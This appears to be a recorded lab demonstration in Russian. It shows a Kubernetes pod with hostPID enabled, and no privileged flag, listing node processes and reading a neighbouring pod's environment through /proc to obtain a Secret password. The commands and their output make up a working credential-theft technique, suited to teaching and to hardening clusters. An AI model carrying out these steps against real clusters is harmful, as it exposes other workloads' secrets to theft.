Записанный вывод кейса. Показывать, если стенд не отвечает.

Прогон сниппета 21 ноября 2026 на управляемом кластере стенда, Kubernetes `v1.35.1`.
Пространство имён `default`. У `hostpid-pod` задан `hostPID: true`, поле `privileged` отсутствует.

Состояние подов после применения манифеста:

```bash
$ kubectl get pods -l case=privileged-read-env
NAME          READY   STATUS    RESTARTS   AGE
hostpid-pod   1/1     Running   0          4s
secret-pod    1/1     Running   0          4s
```

На поде `secret-pod` переменные окружения:

```bash
$ env | grep password
password=very_secure_password
```

На поде `hostpid-pod` список процессов. Благодаря hostPID видны процессы
узла: init, kubelet и оба контейнера кейса. Вывод сокращён:

```bash
$ ps
PID   USER     TIME  COMMAND
    1 root      0:46 {systemd} /sbin/init
 1195 root      5h00 /home/kubernetes/bin/kubelet ...
4187762 root      0:00 tail -f /dev/null
4187789 root      0:00 sleep infinity
```

Pid процесса соседнего пода:

```bash
$ pidof tail
4187762
```

Переменные окружения процесса соседнего пода. Среди них password из
Secret. Читающий процесс идёт от uid `0`, поле `privileged` у него не задано:

```bash
$ cat /proc/4187762/environ | tr '\0' '\n'
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=secret-pod
password=very_secure_password
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.112.0.1:443
KUBERNETES_PORT_443_TCP=tcp://10.112.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_ADDR=10.112.0.1
KUBERNETES_SERVICE_HOST=10.112.0.1
KUBERNETES_SERVICE_PORT=443
HOME=/root
```
